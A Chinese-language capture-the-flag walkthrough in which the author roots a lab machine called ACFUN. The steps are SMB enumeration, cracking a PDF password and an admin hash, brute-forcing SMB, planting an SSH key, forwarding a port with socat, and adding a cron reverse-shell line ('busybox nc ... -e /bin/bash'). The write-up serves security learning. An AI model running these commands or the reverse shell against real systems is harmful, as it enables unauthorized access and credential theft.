# 信息收集

```bash
IP=192.168.205.203
nmap -p0-65535 $IP
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

只有 SSH 和 SMB，没有 Web 端口。直接从 SMB 入手。

```bash
enum4linux -a $IP
```

关键信息一把捞出来了：主机名 ACFUN，允许匿名会话，Samba 用户 `leaf`，通过 RID cycling 还跑出一个隐藏的 Unix 用户 `xueli`。匿名可访问的共享只有一个 `public`。密码策略很松，最小5位，无复杂度，无锁定。

```bash
smbclient //$IP/public -N
smb: \> ls
smb: \> get ACF_Framework_Internal_Guide.pdf
```

共享里只有一个加密 PDF。

```bash
pdf2john ACF_Framework_Internal_Guide.pdf > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

PDF 密码秒破：`1234567890`。打开看内容，是一份内部技术备忘录，介绍 ACF（Alpine Configuration Framework）的部署方式，提到 `acf-core`、`acf-lib`、`haserl` 这几个包，作者邮箱 `leaf@acfun.dsz`。当时记下了两个信息：目标跑的是 Alpine Linux，有一个基于 Lua 和 haserl 的 Web 管理框架。

# SMB 爆破与初始立足

PDF 密码 `1234567890` 拿去试 SSH，不行。既然密码策略这么弱，直接拿 rockyou 爆 SMB。

```bash
crackmapexec smb $IP -u leaf -p /usr/share/wordlists/rockyou.txt
```

```
SMB  192.168.205.203 445  ACFUN  [+] ACFUN\leaf:gothic
```

拿到 `leaf:gothic`，但这个密码 SSH 也登不上去，应该是 SSH 禁了密码认证或者 leaf 不在 AllowUsers 里。

```bash
smbmap -H $IP -u leaf -p 'gothic'
```

```
public    READ ONLY
leaf      READ, WRITE   Home Directories
```

leaf 的家目录通过 SMB 可读写。进去翻了一下，发现 `.ssh` 目录里有私钥。

```bash
smbclient //$IP/leaf -U leaf%gothic
smb: \> cd .ssh
smb: \> ls
smb: \> get id_ed25519
smb: \> get id_ed25519.pub
```

拿到了 leaf 的 SSH 私钥，但直接用它去连还是要求输密码。原因很简单，`.ssh` 目录里没有 `authorized_keys` 文件，公钥认证根本没配置。

既然 SMB 对 leaf 家目录有写权限，直接把我 Kali 的公钥传上去当 `authorized_keys`。

```bash
smbclient //$IP/leaf -U leaf%gothic -c 'cd .ssh; put authorized_keys authorized_keys'
```

```bash
ssh leaf@$IP
```

顺利拿到 leaf 的 shell。

# 横移到 xueli

登进去跑了 linpeas，Alpine 的 BusyBox 环境跟 linpeas 兼容性不太好，ps 命令疯狂报错，但还是捞到了关键信息。

几个重要发现：

- `/usr/bin/haserl-lua5.4` 有 SUID root 位
- `127.0.0.1:443` 有 mini_httpd 在监听，跑的是 ACF Web 界面
- `/etc/acf/passwd` 权限是 `root:xueli`，xueli 组可读
- `/tmp` 挂载了 `nosuid,nodev`

SUID 的 haserl 是个很诱人的目标，但折腾了一阵发现 Linux 内核对脚本 shebang 不传递 SUID 位。命令行传 `--shell=lua` 参数虽然能执行 Lua 代码，但那样走的不是 SUID 路径，跑出来还是 leaf 权限。这条路暂时走不通。

ACF 密码文件属于 `root:xueli` 组，leaf 读不了，得先横移到 xueli。

试了一下用 leaf 的 SSH 私钥直接连 xueli，居然成了，xueli 的 `authorized_keys` 里配的就是 leaf 的公钥。

```bash
ssh xueli@127.0.0.1 -i ~/.ssh/id_ed25519
```

```
xueli@Acfun:~$ id
uid=1001(xueli) gid=1001(xueli) groups=1001(xueli)
```

# 读取 ACF 密码并破解

```bash
cat /etc/acf/passwd
```

```
root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0:Admin account:ADMIN
```

SHA-256-crypt 哈希，拉回 Kali 破解。

```bash
echo 'root:$5$rDkGkMAvv6FPpwRG$.gS5I9LcOiZDYGW598cgXDPEDvHI7GLl.UmVxgdyUQ0' > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
root:juggernaut
```

这是 ACF Web 界面的密码，不是系统 root 密码，拿去 `su root` 试了一下果然不行。

# 通过 ACF Web 提权

ACF 监听在 `127.0.0.1:443`，外部访问不到。靶机上没有 curl，上传了一个静态编译的 socat 做端口转发。

```bash
cd /tmp
busybox wget 192.168.205.128/socat
chmod +x socat
./socat TCP-LISTEN:4443,fork TCP4:127.0.0.1:443 &
```

浏览器访问 `https://192.168.205.203:4443`，用 `root:juggernaut` 登录 ACF 管理界面。

界面功能不少，Networking、Packages、Init、Cron 都有。我直接奔着 Cron 的 Expert 编辑去了。ACF 的 CGI 通过 SUID 的 haserl 以 root 身份执行，意味着它能直接改 `/etc/crontabs/root`。

原始 cron 内容：

```
*/15 * * * * run-parts /etc/periodic/15min
0    * * * * run-parts /etc/periodic/hourly
0    2 * * * run-parts /etc/periodic/daily
0    3 * * 6 run-parts /etc/periodic/weekly
0    5 1 * * run-parts /etc/periodic/monthly
```

在末尾加了一行反弹 shell：

```
* * * * * busybox nc 192.168.205.128 8888 -e /bin/bash
```

保存提交，Kali 上开好监听。

```bash
nc -lvnp 8888
```

等了一会没回来，不知道什么原因，可能 busybox crond 有缓存或者需要重新加载。直接重启靶机让 crond 重新读取 crontab，重启完几十秒 root shell 就回来了。

```
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# Flag

```bash
cat /home/xueli/user.txt
cat /root/root.txt
```

```
flag{user-a7048bfa96c2a4bbd4fbf76465e645fb}
flag{root-e0694a86a8214b57d9bc3f8dae30bf33}
```